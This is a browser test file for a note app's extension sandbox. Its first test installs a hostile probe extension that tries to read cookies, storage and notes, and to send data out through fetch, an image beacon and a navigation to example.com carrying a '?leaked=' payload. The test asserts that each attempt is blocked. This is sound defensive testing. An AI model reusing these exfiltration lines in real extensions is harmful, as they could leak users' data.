// The sandbox, in a real browser against the real Worker (ADR 0006): a hostile workspace extension
// tries every way out, and none works. Run with `npm run test:browser` after `npm run build`; it needs
// Chrome (CHROME_PATH, or Chrome where it usually is).
import assert from "node:assert/strict";
import { existsSync } from "node:fs";
import { after, before, test } from "node:test";
import { chromium, type Browser, type Page } from "playwright-core";
import { unstable_dev, type Unstable_DevWorker } from "wrangler";

const CHROME = [process.env.CHROME_PATH, "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium"].find(
  (p) => p && existsSync(p),
);

let worker: Unstable_DevWorker;
let browser: Browser;
let base: string;

before(async () => {
  assert.ok(CHROME, "Chrome is needed: set CHROME_PATH");
  worker = await unstable_dev("worker/src/index.ts", {
    config: "worker/wrangler.jsonc",
    vars: { DEV_USER: "tester@localhost", SEED: "1", DATA_FIXTURES: "1" },
    experimental: { disableExperimentalWarning: true },
    persist: false,
    logLevel: "none",
  } as never);
  base = `http://${worker.address}:${worker.port}`;
  browser = await chromium.launch({ executablePath: CHROME, headless: true });
});

after(async () => {
  await browser?.close();
  await worker?.stop();
});

/** Put a workspace extension's files in, as the signed-in person. */
async function install(page: Page, id: string, files: Record<string, string>) {
  for (const [file, text] of Object.entries(files)) {
    await page.evaluate(
      async ([path, text]) => {
        const res = await fetch(`/api/file?path=${encodeURIComponent(path)}`);
        const base = res.status === 200 ? (await res.json()).revision : 0;
        await fetch("/api/file", { method: "PUT", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ path, text, base }) });
      },
      [`.common-ink/extensions/${id}/${file}`, text],
    );
  }
}

const runCommand = (page: Page, title: string) =>
  page.evaluate((title) => {
    window.dispatchEvent(new KeyboardEvent("keydown", { key: "p", metaKey: true, ctrlKey: !navigator.platform.includes("Mac"), shiftKey: true, bubbles: true }));
    const input = document.querySelector<HTMLInputElement>("#command-bar input")!;
    input.value = `>${title}`;
    input.dispatchEvent(new Event("input"));
    input.dispatchEvent(new KeyboardEvent("keydown", { key: "Enter", bubbles: true }));
  }, title);

const PROBE = `export default { async activate(ctx) {
  const r = {};
  const t = async (k, f) => { try { await f(); r[k] = "reached"; } catch (e) { r[k] = "blocked"; } };
  await t("cookie", () => document.cookie);
  await t("localStorage", () => localStorage.length);
  await t("parentDocument", () => parent.document.title);
  await t("fetchApp", () => fetch("/api/files"));
  await t("fetchOut", () => fetch("https://example.com/"));
  await t("image", () => new Promise((ok, no) => { const i = new Image(); i.onload = ok; i.onerror = () => no(new Error("no")); i.src = "https://example.com/beacon.png?d=1"; }));
  await t("readNote", () => ctx.files.read("Welcome.md"));
  await t("undeclaredHost", () => ctx.net.fetch("https://example.com/?d=1"));
  ctx.commands.register("probe.run", () => {});
  await ctx.workbench.notice("PROBE " + JSON.stringify(r));
  // Last: try to leave, with data in the address.
  setTimeout(() => { location.href = "https://example.com/?leaked=" + encodeURIComponent(JSON.stringify(r)); }, 50);
} };`;

test("a sandboxed extension can't read the app's cookies, storage, page or notes, or reach the network", async () => {
  const page = await browser.newPage();
  // Chrome reports a request it blocks by policy too, as one that failed with "csp";
  // anything else that set out for another host left the app.
  const outside = new Map<string, string>();
  page.on("request", (req) => {
    if (!req.url().startsWith(base)) outside.set(req.url(), "sent");
  });
  page.on("requestfailed", (req) => {
    if (outside.has(req.url())) outside.set(req.url(), req.failure()?.errorText ?? "failed");
  });
  await page.goto(`${base}/`);
  await page.waitForSelector(".cm-content");
  await page.evaluate(() => localStorage.setItem("secret", "1"));
  await install(page, "probe", {
    "extension.json": JSON.stringify({ name: "Probe", activationEvents: ["onCommand:probe.run"], contributes: { commands: [{ command: "probe.run", title: "Run probe" }] } }),
    "index.js": PROBE,
  });
  await page.reload();
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Run probe");
  await page.waitForFunction(() => [...document.querySelectorAll(".notice p")].some((p) => p.textContent?.includes("PROBE")));
  const said = await page.evaluate(() => [...document.querySelectorAll(".notice p")].map((p) => p.textContent).find((t) => t?.includes("PROBE"))!);
  assert.deepEqual(JSON.parse(said.slice(said.indexOf("{"))), {
    cookie: "blocked",
    localStorage: "blocked",
    parentDocument: "blocked",
    fetchApp: "blocked",
    fetchOut: "blocked",
    image: "blocked",
    readNote: "blocked",
    undeclaredHost: "blocked",
  });
  await page.waitForTimeout(500);
  assert.deepEqual(
    [...outside].filter(([, how]) => how !== "csp" && how !== "net::ERR_BLOCKED_BY_CSP"),
    [],
    "nothing left the app, not even by navigating the frame away",
  );
  assert.ok(!page.frames().some((f) => f.url().includes("example.com")), "no frame got to the other site");
  await page.waitForFunction(() => document.body.textContent?.includes("tried to navigate its frame away"), null, { timeout: 5000 }).catch(() => {});
  const records = await page.evaluate(() => fetch("/api/files").then(() => document.querySelectorAll("iframe[title='Probe (extension host)']").length));
  assert.equal(records, 0, "and its host was stopped");
  await page.close();
});

test("a sandboxed view asks before reading a note, and Don't allow is kept", async () => {
  const page = await browser.newPage();
  await page.goto(`${base}/?file=Welcome.md`);
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Show word count");
  await page.waitForSelector(".dialog");
  // Who, what exactly, why now, and why at all, in that order; then what each button does.
  assert.deepEqual(
    await page.evaluate(`[...document.querySelector(".dialog").querySelectorAll("h2, .dialog-asks li, .dialog-why-now, .dialog-why, .dialog-actions button, .dialog-note")].map((e) => e.textContent.replace(/\\s+/g, " ").trim())`),
    [
      "Word count Workspace wants to",
      "Read the note Welcome",
      "It's asking because you ran Show word count.",
      "Word count says: “Count the words in the note on show”",
      "Allow this time",
      "Always allow Word count to read all your notes",
      "Don't allow",
      "You can change this anytime in Extensions → Word count.",
    ],
  );
  assert.equal(await page.textContent(".dialog-details code"), "files:read Welcome.md", "the technical scope is behind Details");
  await page.click("text=Don't allow");
  const webview = await (await page.waitForSelector("iframe.webview")).contentFrame();
  await webview!.waitForFunction(() => document.body.textContent?.includes("Word count can't read the note Welcome: you don't allow it to read all your notes."));
  // Keeping the answer saves your settings, which Word count hears of and counts again: it isn't asked twice.
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "one Don't allow is enough");
  const settings = await page.evaluate(() => fetch("/api/file?path=.common-ink%2Fusers%2Ftester%40localhost%2Fsettings.json").then((r) => r.json()));
  assert.deepEqual(JSON.parse(settings.text)["extensions.permissions"], { "word-count": { "files:read:**/*.md": "deny" } });
  await page.reload();
  await page.waitForSelector(".cm-content");
  await runCommand(page, "Show word count");
  await page.waitForTimeout(1500);
  assert.equal(await page.$(".dialog"), null, "not asked again");
  await page.close();
});
